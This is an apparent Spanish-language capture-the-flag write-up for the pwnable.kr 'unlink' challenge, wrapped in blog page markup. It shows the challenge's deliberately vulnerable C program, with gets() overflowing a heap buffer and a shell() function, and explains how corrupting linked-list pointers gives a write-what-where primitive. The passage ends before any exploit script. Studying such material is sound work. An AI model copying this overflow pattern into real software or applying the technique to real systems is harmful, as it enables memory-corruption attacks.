@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pwnable.kr unlink - Heap Overflow via Double-Linked list y Write-What-Where | c4rta</title>
+<meta name="generator" content="Jekyll v4.3.2">
+<meta property="og:title" content="pwnable.kr unlink - Heap Overflow via Double-Linked list y Write-What-Where">
+<meta name="author" content="c4rta">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Explotaremos un Heap Overflow en una lista doblemente enlazada con una condicion Write-What-Where que nos permitira escribir la direccion de la funcion shell() en A-&gt;buf">
+<meta property="og:description" content="Explotaremos un Heap Overflow en una lista doblemente enlazada con una condicion Write-What-Where que nos permitira escribir la direccion de la funcion shell() en A-&gt;buf">
+<link rel="canonical" href="https://ic4rta.github.io//explotacion%20binaria/2023/04/16/pwnable.kr-unlink.html">
+<meta property="og:url" content="https://ic4rta.github.io//explotacion%20binaria/2023/04/16/pwnable.kr-unlink.html">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-04-16T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="pwnable.kr unlink - Heap Overflow via Double-Linked list y Write-What-Where">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c4rta"},"dateModified":"2023-04-16T00:00:00+00:00","datePublished":"2023-04-16T00:00:00+00:00","description":"Explotaremos un Heap Overflow en una lista doblemente enlazada con una condicion Write-What-Where que nos permitira escribir la direccion de la funcion shell() en A-&gt;buf","headline":"pwnable.kr unlink - Heap Overflow via Double-Linked list y Write-What-Where","mainEntityOfPage":{"@type":"WebPage","@id":"https://ic4rta.github.io//explotacion%20binaria/2023/04/16/pwnable.kr-unlink.html"},"url":"https://ic4rta.github.io//explotacion%20binaria/2023/04/16/pwnable.kr-unlink.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="/favicon.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script>
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+<link type="application/atom+xml" rel="alternate" href="https://ic4rta.github.io//feed.xml" title="c4rta">
+<script>
+  function initGoogleAnalytics() {
+    var doNotTrack = (window.doNotTrack === "1" || navigator.doNotTrack === "1" ||
+      navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1");
+    var enableDNT = "true" == "true";
+
+    if (!enableDNT || !doNotTrack) {
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-212989441-1', 'auto');
+      ga('send', 'pageview');
+    }
+  }
+  window.addEventListener("load", initGoogleAnalytics);
+</script>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #fff -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #ff4e00 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+
+</head>
+<body>
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+<header class="site-header site-header-transparent" role="banner">
+
+  <div class="wrapper">    
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="c4rta" src="/favicon.png" onerror="this.style.display='none'">
+  c4rta
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>      
+          <div class="trigger">
+<a class="page-link" href="/">Home</a><a class="page-link" href="/categories.html">Categorias</a><a class="page-link" href="/tags.html">Etiquetas</a><a class="page-link" href="/about.html">Sobre Mi</a><a class="page-link" href="https://github.com/ic4rta" target="_blank"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
+            <a class="page-link" href="http://twitter.com/_c4rta_" target="_blank"><img src="https://img.shields.io/badge/Twitter%20-%230077B5.svg?&style=for-the-badge&logo=Twitter&logoColor=white%22" alt="Twitter"></a>
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+</div>
+        </nav>
+</div>
+  </div>
+
+</header>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+<script>
+  function initHeader() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;documentElement.setAttribute("data-header-transparent", "");var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  }
+  document.addEventListener('DOMContentLoaded', initHeader);
+</script>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+<style>
+    html .page-banner {
+      background: #000;
+    }
+  </style>
+<style>html .page-banner {
+      height:  18.4vh;
+      min-height: 50vh;
+    }
+    html[data-scroll-status="top"] .page-banner {
+      height: 50vh;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-img > *:first-child {
+      opacity: 0.618;
+    }
+
+    html[data-theme="dark"] .page-banner .page-banner-img > *:first-child {
+      opacity: 0.443724;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(1) {
+      font-size: 2.25em; font-weight: bold; 
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(2) {
+      color: gold
+    }
+  </style>
+<section class="page-banner">
+    <div class="page-banner-img">
+<div style="background-image: url(/assets/images/home/home-t.png)"></div>
+        <img class="img-placeholder" src="/assets/images/home/home-t.png">
+</div>
+    <div class="wrapper">
+      <div class="page-banner-inner">
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">pwnable.kr unlink - Heap Overflow via Double-Linked list y Write-What-Where</h1>
+  <h2 class="post-subtitle"></h2>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2023-04-16T00:00:00+00:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Apr 16, 2023
+    </time>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_article_words] 1436 -->
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 8 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#Heap">#Heap</a><a class="post-tag" href="/tags.html#Double-linked%20list">#Double-linked list</a><a class="post-tag" href="/tags.html#Write-What-Where">#Write-What-Where</a>
+</div></header>
+</div>
+    </div>
+  </section><script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    hashValue = decodeURIComponent(hashValue);
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+  
+      <!-- [function][get_value] auto -->
+  
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <p class="lead">Explotaremos un Heap Overflow en una lista doblemente enlazada con una condicion Write-What-Where que nos permitira escribir la direccion de la funcion shell() en A-&gt;buf</p>
+
+<p>Este es un desafio de los gordos, como ayuda, te dejo este gran writeup el cual me ayudo bastante a entender que pedo: <a href="https://youtu.be/81_BMRXDw3c">picale aqui</a></p>
+
+<h2 id="analisis">Analisis</h2>
+
+<p>Se nos proporciona el codigo fuente del programa, donde primeramente se esta definiendo una estructura llamada <code class="language-plaintext highlighter-rouge">OBJ</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tagOBJ</span><span class="p">{</span>
+	<span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="p">}</span><span class="n">OBJ</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Primero se definen dos punteros a la estructura <code class="language-plaintext highlighter-rouge">tagOBJ</code> llamados <code class="language-plaintext highlighter-rouge">fd</code> y <code class="language-plaintext highlighter-rouge">bk</code> y un arreglo de char (que seria el buffer) con una longitud de 8 bytes, los punteros <code class="language-plaintext highlighter-rouge">fd</code> y <code class="language-plaintext highlighter-rouge">bk</code> son usados normalmente para implementar una lista doblemente enlazada, y para eso esta esta funcion:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">unlink</span><span class="p">(</span><span class="n">OBJ</span><span class="o">*</span> <span class="n">P</span><span class="p">){</span>
+	<span class="n">OBJ</span><span class="o">*</span> <span class="n">BK</span><span class="p">;</span>
+	<span class="n">OBJ</span><span class="o">*</span> <span class="n">FD</span><span class="p">;</span>
+	<span class="n">BK</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+	<span class="n">FD</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+	<span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">=</span><span class="n">BK</span><span class="p">;</span>
+	<span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="n">FD</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Donde el puntero <code class="language-plaintext highlighter-rouge">fd</code> apunta al siguiente elemento, y <code class="language-plaintext highlighter-rouge">bk</code> apunta al elemento anterior.</p>
+
+<p>Codigo completo:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tagOBJ</span><span class="p">{</span>
+	<span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="p">}</span><span class="n">OBJ</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">shell</span><span class="p">(){</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">unlink</span><span class="p">(</span><span class="n">OBJ</span><span class="o">*</span> <span class="n">P</span><span class="p">){</span>
+	<span class="n">OBJ</span><span class="o">*</span> <span class="n">BK</span><span class="p">;</span>
+	<span class="n">OBJ</span><span class="o">*</span> <span class="n">FD</span><span class="p">;</span>
+	<span class="n">BK</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+	<span class="n">FD</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+	<span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">=</span><span class="n">BK</span><span class="p">;</span>
+	<span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="n">FD</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="n">malloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span>
+	<span class="n">OBJ</span><span class="o">*</span> <span class="n">A</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
+	<span class="n">OBJ</span><span class="o">*</span> <span class="n">B</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
+	<span class="n">OBJ</span><span class="o">*</span> <span class="n">C</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
+
+	<span class="c1">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span>
+	<span class="n">A</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
+	<span class="n">B</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">A</span><span class="p">;</span>
+	<span class="n">B</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">C</span><span class="p">;</span>
+	<span class="n">C</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"here is stack address leak: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">A</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"here is heap address leak: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">A</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"now that you have leaks, get shell!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="c1">// heap overflow!</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">A</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">);</span>
+
+	<span class="c1">// exploit this unlink!</span>
+	<span class="n">unlink</span><span class="p">(</span><span class="n">B</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Se esta haciendo basicamente esto:</p>
+
+<ul>
+  <li>Crea tres nodos (A, B y C)</li>
+  <li>Se crea una lista doblemente enlazada con A en primer lugar, B en segundo y C en tercero.</li>
+  <li>Muestra la dirección donde el puntero <code class="language-plaintext highlighter-rouge">&amp;A</code> cuando mantiene en el stack como una variable local</li>
+  <li>Muestra la dirección en la que se guarda el nodo A en el heap.</li>
+  <li>Obtiene un imput el cual puede sobreescribir la memoria que comienza con <code class="language-plaintext highlighter-rouge">A-&gt;buf</code> en el heap</li>
+  <li>Llama a unlink con el nodo B</li>
+</ul>
+
+<h3 id="vulnerabilidad">Vulnerabilidad</h3>
+
+<p>En la funcion main se esta haciendo un llamado a la funcion gets: <code class="language-plaintext highlighter-rouge">gets(A-&gt;buf);</code>, donde se esta ocasionando un heap overflow a partir de del nodo A (<code class="language-plaintext highlighter-rouge">A-&gt;buf</code>).</p>
+
+<p>Debido a que ocurrio un heap overflow y el programa soporta una operacion de desvinculacion en el nodo B:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">=</span><span class="n">BK</span><span class="p">;</span>
+<span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="n">FD</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Debemos de explotar la funcion <code class="language-plaintext highlighter-rouge">unlink</code>, donde podemos sobreescribir el <code class="language-plaintext highlighter-rouge">fd</code> y el <code class="language-plaintext highlighter-rouge">bk</code> del nodo B, cuando el nodo B se desvincula, ocurre que:</p>
+
+<ul>
+  <li>El nodo apuntado por B-&gt;fd(antes C) cambiará a B-&gt;bk(antes A)</li>
+  <li>El nodo apuntado por B-&gt;bk(antes A) cambiará a B-&gt;fd(antes C)</li>
+</ul>
+
+<p><strong>Metodo de explotacion 1 (incorrecto)</strong></p>
+
+<p>Podriamos hacer que B-&gt;bk apunte a una direccion de <code class="language-plaintext highlighter-rouge">ebp</code> y despues sobrescribirlo con la dirección de la funcion <code class="language-plaintext highlighter-rouge">shell</code> en <code class="language-plaintext highlighter-rouge">B-&gt;fd</code></p>
+
+<p>Pero no se puede, si ponemos la direccion de la funcion <code class="language-plaintext highlighter-rouge">shell()</code> en <code class="language-plaintext highlighter-rouge">B-&gt;fd</code> o <code class="language-plaintext highlighter-rouge">B-&gt;bk</code>, no se ve a poder ejecutar por que cuando se ejecute <code class="language-plaintext highlighter-rouge">BK-&gt;fd=FD</code>, la funcion <code class="language-plaintext highlighter-rouge">unlink</code> tratara de escribir en la misma direccion.</p>
+
